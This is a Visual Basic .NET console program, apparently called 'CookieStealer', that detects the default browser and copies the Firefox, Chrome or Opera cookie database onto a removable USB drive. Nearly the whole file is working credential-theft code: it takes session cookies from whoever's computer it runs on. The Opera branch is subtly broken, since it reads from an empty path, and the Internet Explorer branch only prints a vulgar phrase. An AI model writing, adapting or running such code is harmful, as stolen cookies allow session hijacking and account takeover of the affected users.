Imports System.Environment
Imports System
Imports System.IO

Module Module1

    Private Function getDefaultBrowser() As String
        Dim retVal As String = String.Empty
        Using baseKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Clients\StartmenuInternet")
            Dim baseName As String = baseKey.GetValue("").ToString
            Dim subKey As String = "SOFTWARE\" & IIf(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") = "AMD64", "Wow6432Node\", "") & "Clients\StartMenuInternet\" & baseName
            Using browserKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.LocalMachine.OpenSubKey(subKey)
                retVal = browserKey.GetValue("").ToString
            End Using
        End Using
        Return retVal
    End Function


    Sub Main()

        Dim username As String = ""
        Dim browser As String = ""
        Dim usbletter As String = ""

        browser = getDefaultBrowser()
        Console.WriteLine(browser)

        If browser = "Mozilla Firefox" Then
            Dim path As String = ""
            Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)    ' Get the path to the Application Data folder
            appData = appData + "\Mozilla\Firefox\Profiles"                         ' Adds more precise directory
            Console.WriteLine("App Data Folder Path: " & appData)                   ' Display the path

            For Each Dir As String In Directory.GetDirectories(appData)
                path = Dir
                Console.WriteLine("Path: " & path)
            Next

            For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
                If d.DriveType = System.IO.DriveType.Removable Then
                    usbletter = d.Name
                    Console.WriteLine(usbletter)
                End If
            Next

            Dim FileToCopy As String = path & "\cookies.sqlite"
            Console.WriteLine(FileToCopy)

            Dim NewCopy As String = ""
            NewCopy = usbletter & "CookieStealer\Data\Firefox\" & DateTime.Now.ToString("yyyyMMdd_HH_mm_ss") & ".sqlite"
            Console.WriteLine(NewCopy)


            If System.IO.File.Exists(FileToCopy) = True Then

                System.IO.File.Copy(FileToCopy, NewCopy)
                Console.WriteLine("File Copied")

            End If

        ElseIf browser = "Google Chrome" Then
            Dim path As String = ""
            Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)    ' Get the path to the Application Data folder
            appData = Microsoft.VisualBasic.Left(appData, appData.Length - 7)
            appData = appData & "Local\Google\Chrome\User Data\Default"
            Console.WriteLine("App Data Folder Path: " & appData)                   ' Display the path

            For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
                If d.DriveType = System.IO.DriveType.Removable Then
                    usbletter = d.Name
                    Console.WriteLine(usbletter)
                End If
            Next

            Dim FileToCopy As String = appData & "\Cookies"
            Console.WriteLine(FileToCopy)

            Dim NewCopy As String = ""
            NewCopy = usbletter & "CookieStealer\Data\Chrome\" & DateTime.Now.ToString("yyyyMMdd_HH_mm_ss") & ".sqlite"
            Console.WriteLine(NewCopy)

            If System.IO.File.Exists(FileToCopy) = True Then
                System.IO.File.Copy(FileToCopy, NewCopy)
                Console.WriteLine("File Copied")
            End If


        ElseIf browser = "Opera" Then
            Dim path As String = ""
            Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)    ' Get the path to the Application Data folder
            appData = appData + "\Opera\Opera\"                         ' Adds more precise directory
            Console.WriteLine("App Data Folder Path: " & appData)                   ' Display the path

            For Each d As System.IO.DriveInfo In My.Computer.FileSystem.Drives
                If d.DriveType = System.IO.DriveType.Removable Then
                    usbletter = d.Name
                    Console.WriteLine(usbletter)
                End If
            Next

            Dim FileToCopy As String = path & "cookies4.dat"
            Console.WriteLine(FileToCopy)

            Dim NewCopy As String = ""
            NewCopy = usbletter & "CookieStealer\Data\Opera" & DateTime.Now.ToString("yyyyMMdd_HH_mm_ss") & ".dat"
            Console.WriteLine(NewCopy)


            If System.IO.File.Exists(FileToCopy) = True Then

                System.IO.File.Copy(FileToCopy, NewCopy)
                Console.WriteLine("File Copied")

            End If






        ElseIf browser = "Internet Explorer" Then

            Console.WriteLine("E PA JEBIGA")
            Console.WriteLine(Environment.OSVersion.ToString)


        End If

        

    End Sub

End Module
